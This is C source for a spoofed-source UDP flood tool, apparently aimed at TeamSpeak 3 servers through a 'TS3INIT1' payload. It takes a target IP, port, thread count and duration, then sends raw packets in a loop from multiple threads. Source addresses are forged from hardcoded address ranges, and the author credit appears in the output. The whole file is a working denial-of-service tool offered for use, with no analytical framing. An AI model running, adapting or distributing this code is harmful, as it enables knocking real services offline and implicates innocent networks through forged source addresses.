#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9


static uint32_t Q[4096], c = 362436;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
static unsigned int attport;
void init_rand(uint32_t x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++)
        {
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
        }
}
 
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
 
/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
        unsigned long sum;
        for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}
 
void setup_ip_header(struct iphdr *iph)
{
      iph->ihl = 5;
      iph->version = 4;
      iph->tos = 0;
      iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + (10+rand()%99);
      iph->id = htonl(rand()%54321);
      iph->frag_off = 0;
      iph->ttl = 128;
      iph->protocol = IPPROTO_UDP;
      iph->check = 0;
      iph->saddr = inet_addr("192.168.3.100");
}

void setup_udp_header(struct udphdr *udph)
{
      udph->source = htons(rand()%65535);
      udph->check = 0;
	  
      memcpy((void *)udph + sizeof(struct udphdr), "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 34);
      udph->len=htons(sizeof(struct udphdr) + (10+rand()%99));
}
 
void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin;
		sin.sin_family = AF_INET;
		
		sin.sin_addr.s_addr = inet_addr(td);
		
		sin.sin_port = attport;
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s < 0){
                fprintf(stderr, "Could not open raw socket.\n");
                exit(-1);
        }
		
        init_rand(time(NULL));
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_udp_header(udph);
		udph->dest = attport;
        udph->source = htons(rand()%65535);
        iph->daddr = sin.sin_addr.s_addr;
		
	//	iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
	
			int x,y,z;
			int fx = 1+rand()%14;
			
			// 195.238.165
			// 172.68.65
			// 172.68.11
			// 185.186.32
			// 105.233.66
			// 105.233.65
			// 105.233.67
			// 109.206.71
			// 109.206.70
			
			
			switch(fx){
				case 1:
				x=162;
				y=254;
				z=196;
				break;
				
				case 2:
				x=172;
				y=69;
				z=55;
				break;
				
				case 3:
				x=162;
				y=158;
				z=183;
				break;
				
				case 4:
				x=108;
				y=162;
				z=229;
				break;
				
				case 5:
				x=185;
				y=228;
				z=232;
				break;
				
				case 6:
				x=141;
				y=101;
				z=69;
				break;
				
				case 7:
				x=162;
				y=158;
				z=183;
				break;
				
				case 8:
				x=45;
				y=155;
				z=205;
				break;
				
				case 9:
				x=212;
				y=251;
				z=94;
				break;
			}
			
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (z) << 16  | (y) << 8 | (x);
			
	
		
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
                fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
                exit(-1);
        }
        int i=0;
        while(1){
                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
				udph->source = htons(rand()%65535);
				
			

			int x,y,z;
			int fx = 1+rand()%14;
			
			// 162.254.196.84
			// 172.69.55.16
			// 162.158.183.107
			// 108.162.229.85
			// 185.228.232.38
			// 
			// 141.101.69.72
			// 162.158.183.126
			// 45.155.205.41
			// 212.251.94.206
			
			
			switch(fx){
				case 1:
				x=162;
				y=254;
				z=196;
				break;
				
				case 2:
				x=172;
				y=69;
				z=55;
				break;
				
				case 3:
				x=162;
				y=158;
				z=183;
				break;
				
				case 4:
				x=108;
				y=162;
				z=229;
				break;
				
				case 5:
				x=185;
				y=228;
				z=232;
				break;
				
				case 6:
				x=141;
				y=101;
				z=69;
				break;
				
				case 7:
				x=162;
				y=158;
				z=183;
				break;
				
				case 8:
				x=172;
				y=69; //172.69.190
				z=190;
				break;
				
				case 9:
				x=212;
				y=251;
				z=94;
				break;
			}
			
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (z) << 16  | (y) << 8 | (x);
				
				
				iph->daddr = sin.sin_addr.s_addr;
				iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
				
				
                if(i==5)
                {
                        usleep(0);
                        i=0;
                }
                i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 4){
                fprintf(stderr, "Unknown Parameter!\n");
                fprintf(stdout, "Usage: %s <target IP> <port> <throttle> <time>\n", argv[0]);
                exit(-1);
        }
        int i = 0;
        fprintf(stdout, "Setting up Sockets...\n");
        int max_len = 128;
        char *buffer = (char *) malloc(max_len);
        buffer = memset(buffer, 0x00, max_len);
        int num_threads = atoi(argv[3]);
        pthread_t thread[num_threads];
        struct thread_data td[num_threads];
		attport = htons(atoi(argv[2]));
        for(i = 0;i<num_threads;i++){
                pthread_create( &thread[i], NULL, &flood, (void *) argv[1]);
        }
        fprintf(stdout, "Starting Flood...\n");
        fprintf(stdout, "Coded By: Folleder");
        if(argc > 4)
        {
                sleep(atoi(argv[4]));
        } else {
                while(1){
                        sleep(1);
                }
        }
        return 0;
}

